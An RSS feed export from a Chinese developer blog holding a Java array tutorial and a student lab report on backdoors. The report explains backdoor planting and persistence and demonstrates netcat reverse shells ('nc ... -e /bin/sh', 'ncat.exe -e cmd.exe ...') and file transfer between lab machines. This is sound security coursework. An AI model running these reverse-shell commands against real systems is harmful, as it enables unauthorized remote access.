<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Java基础（五）：数组 - Vi的技术博客</title>
<link>http://www.cnblogs.com/viyoung/p/12521934.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/viyoung/p/12521934.html</guid>
<description>&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;数组，一种应用非常广泛的数据结构，简单地来说就是一组&lt;strong&gt;类型相同&lt;/strong&gt;且&lt;strong&gt;无序&lt;/strong&gt;的元素的存储在&lt;strong&gt;固定长度&lt;/strong&gt;且&lt;strong&gt;有序&lt;/strong&gt;的内存空间。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;创建一个数组&quot;&gt;创建一个数组&lt;/h3&gt;
&lt;p&gt;在Java中，我们可以通过&lt;code&gt;[]&lt;/code&gt;去声明一个指定类型的数组&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;int[] a; // 写法一
int a[]; // 写法二&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当然，一般情况下我们更喜欢使用第一种方式来声明一个数组，因为它将类型与变量名分开，优化了代码的可读性。&lt;br/&gt;刚刚我们只是声明了一个数组 a ，但是并没有将 a 初始化为一个真正的数组。&lt;/p&gt;
&lt;p&gt;在给数组赋值时，我们可以通过三种方式&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;int[] a = new int[4];
int[] a = new int[]{1,2,3,4};
int[] a = {1,4,3,2}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中第三种实际上是第二种的简写，我们可以通过使用 new 关键字去创建一个匿名的数组&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;new int[4];&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;但是记得一定要指定长度或者指定数组中的元素，这里如果想要创建一个匿名的数组，new关键字是必不可少的&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;{1,2,4,3} // 这样写是错误的！&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;无论我们怎么去定义一个数组，它的长度在创建之初都是被确定的，但是需要注意一点，它的长度也不是无穷无尽的，我们可以通过查看反射包中的&lt;code&gt;Array&lt;/code&gt;类源码获得它的长度数据类型：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public static Object newInstance(Class&amp;lt;?&amp;gt; componentType, int length)
        throws NegativeArraySizeException {
        return newArray(componentType, length);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里可以看到数组的数据类型是int类型，而int类型在前面我们也提过，它的最大长度是&lt;span class=&quot;math inline&quot;&gt;\(2^{31}\)&lt;/span&gt;，也就是2GB。&lt;/p&gt;
&lt;h3 id=&quot;访问数组中的元素&quot;&gt;访问数组中的元素&lt;/h3&gt;
&lt;p&gt;我们可以通过下标的方式来访问数组中的元素，数组的下标从0开始，最大长度是数组的长度，如果我们访问超出数组下标范围的数据，就会抛出索引越界异常（ ArrayOutOfIndexError ），因为我们可以通过下标直接访问数组中的元素，所以时间复杂度是O(1)。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;int[] a = {1,2,3};
System.out.println(a[0]); // 1&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;往数组中添加元素&quot;&gt;往数组中添加元素&lt;/h3&gt;
&lt;p&gt;刚刚我们说过，数组中的长度是固定的，所以我们无法去改变该数组的结构，但是我们可以通过另外一种方法来实现这样的效果&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;        int[] arr = {9,7,5};
        int[] temp = new int[arr.length+1];
        for(int i = 0;i &amp;lt; arr.length;i++) { 
            temp[i]=arr[i];
        }
        temp[arr.length] = 6;
        arr = temp;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们来画图分析一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://viyoungblog.oss-cn-beijing.aliyuncs.com/2019-08-26-142707.png&quot; alt=&quot;image-20190826222706460&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;删除元素&quot;&gt;删除元素&lt;/h3&gt;
&lt;p&gt;和新增一样，删除数组中的元素同样是不允许的，我们可以通过和新增类似的方式来完成删除的操作&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;int[] arr = { 1, 2, 3, 4, 5};
int[] tmp = new int[arr.length - 1];
for (int i = 0; i &amp;lt; tmp.length; i++) {
  tmp[i] = arr[i];
}
arr = tmp;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;原理上和新增是比较类似的，这里我就不再画图去详细的说明了&lt;/p&gt;
&lt;h3 id=&quot;二维数组&quot;&gt;二维数组&lt;/h3&gt;
&lt;p&gt;我们像创建一维数组一样可以创建一个二维数组&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;int[][] doubleArr = new int[2][3];
int[][] doubleArr = {{1,2,3,4},{5,6,7,8}};
int[][] doubleArr = new int[5][];&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里需要注意一点，二维数组的创建时，可以指定一个维度的长度，而不指定第二维度的长度，使之动态的变化。比如我们可以画个星星&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;String[][] arr = new String[5][];
for (int i = 0; i &amp;lt; arr.length; i++) {
  arr[i] = new String[i + 1];
  for (int j = 0; j &amp;lt; arr[i].length;j++) {
    arr[i][j] = &quot;*&quot;;
  }
}

for (int i = 0; i &amp;lt; arr.length; i++) {
  for (int j = 0; j &amp;lt; arr[i].length;j++) {
    System.out.print(arr[i][j]);
  }
  System.out.println();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://viyoungblog.oss-cn-beijing.aliyuncs.com/2019-08-26-151109.png&quot; alt=&quot;image-20190826231109164&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;公众号&quot;&gt;公众号&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://viyoungblog.oss-cn-beijing.aliyuncs.com/viyoung/2020-03-15-qrcode_for_gh_a65beceb0947_258.jpg&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 19 Mar 2020 00:36:00 +0000</pubDate>
<dc:creator>Vi的技术博客</dc:creator>
<og:description>数组，一种应用非常广泛的数据结构，简单地来说就是一组 类型相同 且 无序 的元素的存储在 固定长度 且 有序 的内存空间。 创建一个数组 在Java中，我们可以通过 去声明一个指定类型的数组 当然，一</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/viyoung/p/12521934.html</dc:identifier>
</item>
<item>
<title>2019-2020-2 20174313张博《网络对抗技术》Exp2-后门原理与实践 - 20174313张博</title>
<link>http://www.cnblogs.com/zb20174313/p/12506765.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zb20174313/p/12506765.html</guid>
<description>&lt;p&gt;&lt;strong&gt;&lt;span&gt;一、实验名称&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;        &lt;span&gt;后门原理与实践。&lt;/span&gt; &lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;二、实验目的与要求&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·掌握后门的概念，知道常见的后门种类，深入理解后门的运作原理。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·掌握几种常见的后门工具，学会利用后门工具进行一些简单操作。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·增强信息安全意识，认识到后门的危害性，提高对后门的防范意识。&lt;/span&gt; &lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;三、实验原理&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;strong&gt;  &lt;span&gt;&lt;span&gt;3.1&lt;/span&gt; 后门的概念&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    后门是指绕过安全控制而获取对程序或系统访问权的方法，通过它可以绕过正常的认证途径获取对系统的访问。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    对于攻击方，要使用后门入侵一台目标主机或服务器，首先得有一个拥有后门功能的攻击程序，这类程序有很多，包括&lt;span id=&quot;LC3&quot; class=&quot;line&quot;&gt; netcat系列、&lt;span id=&quot;LC4&quot; class=&quot;line&quot;&gt;meterpreter、&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span id=&quot;LC3&quot; class=&quot;line&quot;&gt;&lt;span id=&quot;LC4&quot; class=&quot;line&quot;&gt;&lt;span id=&quot;LC5&quot; class=&quot;line&quot;&gt;intersect和Windows Update等；然后要想方设法把后门程序放到目标系统中，可以通过U盘直接拷贝、钓鱼网站、攻击并绑定到正版软件中、发送邮件和暴力攻击等手段，把后门放进目标系统中；接下来要想让后门起作用，就要先把后门运行起来，对此可以设置开机自启动、定时启动任务、关联启动等方式，这些都可以让后门程序在目标系统中运行起来，这样可以在目标主机中执行后门权限中的所有操作。为了让后门可持续性使用，需要免于被杀毒软件清除掉（恶意代码免杀技术），还要保证连接的稳定性以免被防火墙拦截（隧道技术、加密连接、反弹式连接）。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;    &lt;strong&gt;&lt;span&gt;&lt;span&gt;3.2&lt;/span&gt; 后门程序&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;strong&gt;&lt;span&gt;    &lt;span&gt;3.2.1&lt;/span&gt; nc&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;strong&gt;&lt;span&gt;    （一）&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;又名netcat、ncat，是一个底层工具，进行基本的TCP、UDP数据收发，小巧精致，面世已久，常与其他工具结合使用，起到后门的作用。Linux系统和Mac系统（苹果电脑使用的）往往自带nc，Windows系统则需要自行下载，如果之前没有下载过的话。下载地址还是本课程在码云上的资料站： &lt;strong&gt;&lt;span&gt;https://gitee.com/wildlinux/NetSec/attach_files&lt;/span&gt;&lt;/strong&gt; ，从中可以找到ncat.rar，直接点击下载然后解压即可使用。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200316221841835-1157794387.png&quot; alt=&quot;&quot; width=&quot;858&quot; height=&quot;142&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span&gt;    如上图所示，点击右侧蓝色的下载链接即可下载。ncat.rar和socat.rar都是本实验要用到的，需要提前在Windows主机上准备好。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span&gt;    &lt;strong&gt;（二）&lt;/strong&gt;下面是关于nc工具的一些使用介绍。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    计划是在Windows主机和kali虚拟机之间进行ncat的使用练习，首先分别探知一下两台机器的IP地址。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在Windows机器中，在命令行输入&lt;span&gt;ipconfig&lt;/span&gt;查询。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317093406460-1637520148.png&quot; alt=&quot;&quot; width=&quot;497&quot; height=&quot;114&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图红框所示即Windows机器的IP地址：&lt;span&gt;192.168.1.100&lt;/span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在kali中，可以在命令行输入&lt;span&gt;ip add&lt;/span&gt;来查询IP地址。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317093615573-1669918629.png&quot; alt=&quot;&quot; width=&quot;500&quot; height=&quot;183&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图红框所示部分即为我kali的IP地址：&lt;span&gt;192.168.159.130&lt;/span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    关于ncat工具的使用，有一篇文章进行了较为深入的讲解，参见&lt;strong&gt;&lt;span&gt;https://www.oschina.net/translate/linux-netcat-command?cmp&amp;amp;p=1&lt;/span&gt;&lt;/strong&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·在Windows中获取kali的命令行。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    首先在Windows中找到ncat工具的安装路径。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317103127714-329249692.png&quot; alt=&quot;&quot; width=&quot;393&quot; height=&quot;488&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    通常我们进入Windows的命令行，默认的路径是当前登录该系统的用户文件夹，比如我的用户名是&lt;span&gt;10983&lt;/span&gt;，那么我一开始进入命令行，就是进入了该用户文件夹。我的ncat工具存放在桌面上，我通过&lt;span&gt;dir&lt;/span&gt;命令查看当前目录下所有的文件及子目录，看到桌面的名称是&lt;span&gt;Desktop&lt;/span&gt;，所以就通过&lt;span&gt;cd Desktop\ncat&lt;/span&gt;命令进入桌面上的ncat文件夹，然后执行命令&lt;span&gt;ncat.exe -l -p 4313&lt;/span&gt;，在Windows上建立一台ncat服务器，&lt;span&gt;-l&lt;/span&gt;表示监听，&lt;span&gt;-p&lt;/span&gt;用于指定端口，指定的是4313这个端口，监听前要确定该端口未被占用。也可以不用进入ncat文件夹，但在执行命令时要加上ncat.exe的完整路径。相较之下还是先进入ncat文件夹比较合适。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在Win上开启监听后，在kali命令行中输入&lt;span&gt;nc 192.168.1.100 4313 -e /bin/sh&lt;/span&gt;，这里填写的IP地址是Windows的。此时kali的角色就相当于客户端，向&lt;span&gt;192.168.1.100&lt;/span&gt;（Windows主机的IP地址）的4313端口发起了连接请求，后面的参数表示当它连接成功时执行&lt;span&gt;/bin/bash&lt;/span&gt;，也就是调用命令行。这是一种反向连接，反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，Windows调用kali的命令行，即服务器使用的是由客户端提供的服务。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317110949552-1673616308.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图是在kali中发出连接申请后的情形。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317111339186-560471328.png&quot; alt=&quot;&quot; width=&quot;398&quot; height=&quot;276&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图是连接建立后，在Windows上调用kali命令行的情形，我依次输入了4条指令，可以看到输出都是符合预期的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    结束连接的话，在任意一方都可以结束，在kali一端的话，在命令行中按下ctrl+c，即可以断开连接，如下图所示：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317111834738-1434863473.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    如上图所示，断开连接后，双方的命令行都回归了初始的输入状态。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    以此为例，如果能偷偷建立起这样一条连接的话，那么服务器端就可以肆无忌惮地入侵客户端的系统，还可以想办法提权以获取系统最高权限进而为所欲为。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;    ·在kali中获取Windows的命令行。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;    这一步和上一步的操作是类似的，区别只是把Windows和kali的角色互换了，在这里是把kali当作一个服务器，把Windows当作一个客户端，同样是建立起一个反向连接，服务器kali获取客户端Windows的服务。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;    首先在kali中输入&lt;span&gt;nc -l -p 4313&lt;/span&gt;，建立一台服务器用于监听4313端口。监听后的情形如下图所示，暂时不会有更多提示了。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317112258654-2010056531.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;    在Windows中输入&lt;span&gt;ncat.exe -e cmd.exe 192.168.159.130 4313&lt;/span&gt;，连接Windows的&lt;span&gt;4313&lt;/span&gt;端口，同时示意在连接建立后开启cmd.exe，这正是Windows的命令行。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317112649183-20839892.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图是在Windows中发出连接请求后的情形。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317113124103-721478248.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    如上图所示，在Windows发出连接请求后，kali这边输入命令行后原本空荡荡的命令行也出现了Windows命令行的提示符，并且路径也正是和Windows命令行的当前路径是一样的，都是在ncat文件夹下。&lt;/span&gt;&lt;span&gt;我们可以在这里进行一些测试，比如&lt;span&gt;dir&lt;/span&gt;命令，结果如下。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317133824903-1867552508.png&quot; alt=&quot;&quot; width=&quot;491&quot; height=&quot;178&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    这样Windows主机桌面ncat文件夹里面的文件和目录就都显示出来了。&lt;span&gt;dir&lt;/span&gt;原本不是kali中的命令，不会在kali中得到执行，但一旦我们调用了Windows的shell，就可以用Windows的cmd命令了。再测试一个命令：&lt;span&gt;ipconfig&lt;/span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317141218515-1047783946.png&quot; alt=&quot;&quot; width=&quot;535&quot; height=&quot;385&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图红框所示部分即为ipconfig查询到的IP地址，从中可以看出，虽然是在kali中执行的查询IP地址的命令，但是由于查询环境是Windows的命令行，所以查到的IP地址还是Windows主机的IP地址：&lt;span&gt;192.168.1.100&lt;/span&gt;，而不是kali的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317141703752-1407458937.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    如上图所示，在kali中输入&lt;span&gt;exit&lt;/span&gt;，就退出了正在调用的Windows命令行，连接断开，Windows和kali双方的命令行都恢复了正常的待输入状态。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·为Windows和kali建立实时通信连接。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317143028221-1135063063.png&quot; alt=&quot;&quot; width=&quot;375&quot; height=&quot;39&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在Windows命令行输入&lt;span&gt;ncat.exe -l 4313&lt;/span&gt;，启动ncat服务器监听&lt;span&gt;4313&lt;/span&gt;端口。同时在kali命令行输入&lt;span&gt;nc 192.168.1.100 4313&lt;/span&gt;，这里填的是Windows的IP地址及其监听的端口号，以此连接到Windows主机的4313端口。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317143032025-1142779222.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在连接建立过后，双方就可以在各自的命令行进行对话了。如上图所示，kali在上面，Windows在kali下面，一方发出来的信息，都可以被另一方及时接收到。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·Windows向kali传文件。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    首先在接收方也就是kali侦听指定端口，然后将一个指定的文件发送出去，这个文件必须首先存在，命令为：&lt;span&gt;nc -l -p 4313 &amp;gt; 4313.txt&lt;/span&gt;，文件名没有加地址前缀，要求必须存放在当前目录下。然后在发送方也就是Windows端，向接收方的地址(kali的IP地址和侦听的端口号)发送文件，命令是：&lt;/span&gt;&lt;span&gt;ncat 192.168.159.130 4313 &amp;lt;  4313.txt&lt;/span&gt;&lt;span&gt;。这个命令一经执行，当前目录下就出现了一个名为&lt;span&gt;4313.txt&lt;/span&gt;的空白文件，然后随着传输的进行这个文件会被逐渐填满变得和发送方发送的文件一模一样。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317152706580-1600540252.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;    上图是发送方要发送的文件的示意图，可以看出这是一个txt文件，里面内容如上，存放在桌面的ncat文件夹里。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317153048608-2145484713.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图是在kali接收文件的示意图，可以看出文件已被成功接收。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·从kali向Windows发送文件。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    先是在Windows上侦听指定端口，比如&lt;span&gt;4313&lt;/span&gt;，将收到的数据存储在一个指定的文件中，命令是&lt;span&gt;ncat -l -p 4313 &amp;gt;4313.txt&lt;/span&gt;。然后在kali中将文件发送到Windows上，地址是Windows的ncat服务器侦听端口，命令是：&lt;span&gt;nc 192.168.1.100 4313 &amp;lt; 4313.txt&lt;/span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317161407112-2114104077.png&quot; alt=&quot;&quot; width=&quot;465&quot; height=&quot;184&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图是kali发送文件的示意图，可以看出文件内容、文件名等信息。待传送的文件名是什么，那么传文件命令中的文件名参数就得是什么。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317162352141-1390353710.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图是在Windows中的接收文件的截图，这个命令里面的文件名参数是自拟的，自己定好之后，当前目录下就会出现一个空白文件，这个文件的名字就是命令中指定的那个。上图中命令行里有两个文件接收命令，两个都可以用，区别只是文件名参数不同，只要连接是通着的，那么在当前目录下就可以收到两个内容相同但文件名不同的txt文件。在上图中我验证了&lt;span&gt;43131.txt&lt;/span&gt;这个文件，其内容和kali传过来的文件是一模一样的，说明传送成功了。由于双方的连接一直没有断开，我就在Windows的命令行这边按下了&lt;span&gt;ctrl+c&lt;/span&gt;，以结束连接。由上图可看出命令下面都有一个提示符，那就是按下结束连接的按键时提示的。如果连接一直不断开的话，什么时候结束连接，就看接收方的文件大小吧，如果大小和发送方发送的文件大小一模一样的话，那十有八九就是已经完全接收了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;strong&gt;&lt;span&gt;   3.2.2 Meterpreter&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;strong&gt;   &lt;/strong&gt; Metasploit中的Meterpreter模块在后渗透阶段具有强大的攻击力，meterpreter的常用命令、脚本及使用方式包含信息收集、提权、注册表操作、令牌操纵、哈希利用、后门植入等。本实验用这个东西只是一种比较肤浅的使用，简单输入命令的那种，没有复杂的设计过程。详细介绍可见&lt;span&gt;https://xz.aliyun.com/t/2536&lt;/span&gt;，这里不作过多摘抄，后面有实验内容会涉及。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;四、实验内容&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;4.1 &lt;span class=&quot;s1&quot;&gt;使用netcat&lt;span class=&quot;s1&quot;&gt;获取主机操作Shell&lt;span class=&quot;s1&quot;&gt;，cron&lt;span class=&quot;s1&quot;&gt;启动&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
